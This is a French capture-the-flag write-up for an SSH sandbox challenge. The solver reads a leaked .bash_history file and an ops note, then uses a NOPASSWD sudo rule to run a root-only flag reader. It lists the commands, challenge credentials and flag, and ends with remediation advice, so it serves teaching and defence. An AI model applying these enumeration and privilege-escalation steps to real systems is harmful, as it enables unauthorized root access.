# Writeup — History Perms SSH

**Catégorie** : Sandbox  
**Difficulté** : Medium  
**Points** : 250  
**Flag** : `CTF{history_leak_plus_sudo_misconfig}`

## Contexte

Ce challenge combine deux failles classiques de durcissement SSH :
1. **Fuite via l'historique bash** — un fichier `.bash_history` contient des traces d'actions passées de l'équipe ops
2. **Mauvaise configuration sudo** — une règle `sudoers` permet d'exécuter un binaire root sans mot de passe

## Connexion

```bash
ssh player@<TARGET_IP> -p 5014
# password: player2026
```

## Étapes de résolution

### 1. Inspection de l'historique shell

Après connexion, la première réflexe est de consulter l'historique des commandes :

```bash
player@container:~$ cat ~/.bash_history
cat /opt/ops/notes/incident.txt
```

L'historique révèle qu'un opérateur a consulté un fichier de notes dans `/opt/ops/notes/`.

### 2. Lecture du fichier de notes ops

```bash
player@container:~$ cat /opt/ops/notes/incident.txt
```

Sortie :
```
Incident note:
- Investigate sudo rule drift
- test helper: sudo /usr/local/bin/readflag
```

La note mentionne :
- une règle sudo à vérifier
- un script `/usr/local/bin/readflag`

### 3. Énumération des droits sudo

```bash
player@container:~$ sudo -l
```

Sortie :
```
Matching Defaults entries for player on container:
    env_reset, mail_badpass, secure_path=...

User player may run the following commands on container:
    (root) NOPASSWD: /usr/local/bin/readflag
```

La règle `NOPASSWD` permet d'exécuter `/usr/local/bin/readflag` en tant que root sans mot de passe.

### 4. Récupération du flag

```bash
player@container:~$ sudo /usr/local/bin/readflag
CTF{history_leak_plus_sudo_misconfig}
```

## Explication des vulnérabilités

### Faille 1 — Fuite via `.bash_history`

Le fichier `~/.bash_history` enregistre toutes les commandes exécutées par un utilisateur. Dans un environnement professionnel, les opérateurs laissent régulièrement des traces de leurs opérations de diagnostic, révélant :
- des chemins de fichiers sensibles
- des commandes d'administration
- parfois des credentials en clair

**Risque réel** : un attaquant ayant accès au shell peut reconstituer les actions précédentes et découvrir la topologie interne du système.

### Faille 2 — Règle sudo trop permissive

La ligne sudoers :
```
player ALL=(root) NOPASSWD:/usr/local/bin/readflag
```

permet d'exécuter `/usr/local/bin/readflag` en root sans authentification supplémentaire. Si ce binaire lit un fichier arbitraire (ici `/opt/secret/flag.txt` en 600/root), le joueur obtient un accès indirect à des données root-only.

## Recommandations de remédiation

1. **Vider l'historique avant de créer des images** :
   ```dockerfile
   RUN history -c && rm -f ~/.bash_history
   ```
2. **Désactiver l'historique pour les comptes de challenge** :
   ```bash
   echo 'HISTSIZE=0' >> /home/player/.bashrc
   ```
3. **Auditer les règles sudoers régulièrement** :
   ```bash
   cat /etc/sudoers /etc/sudoers.d/*
   ```
4. **Appliquer le principe du moindre privilège** : n'accorder `NOPASSWD` que si strictement nécessaire, et uniquement sur des commandes sans effet de bord (pas de lecture arbitraire).

## Références

- [Bash History - risques de sécurité](https://www.hackingarticles.in/linux-privilege-escalation-using-sudo-rights/)
- MITRE ATT&CK T1552.003 (Bash History) : https://attack.mitre.org/techniques/T1552/003/
- MITRE ATT&CK T1548.003 (Sudo and Sudo Caching) : https://attack.mitre.org/techniques/T1548/003/
